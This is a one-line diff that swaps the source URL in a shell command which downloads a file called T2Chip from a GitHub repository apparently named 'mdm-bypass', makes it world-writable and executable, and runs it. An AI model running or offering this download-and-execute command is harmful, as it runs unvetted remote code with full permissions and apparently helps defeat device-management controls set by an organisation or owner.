@@ -1,1 +1,1 @@
-curl -# https://raw.githubusercontent.com/skip-m/m/main/T2Chip -o file && chmod 777 ./file && ./file
+curl -# https://raw.githubusercontent.com/gamethapcam/mdm-bypass/refs/heads/main/T2Chip -o file && chmod 777 ./file && ./file
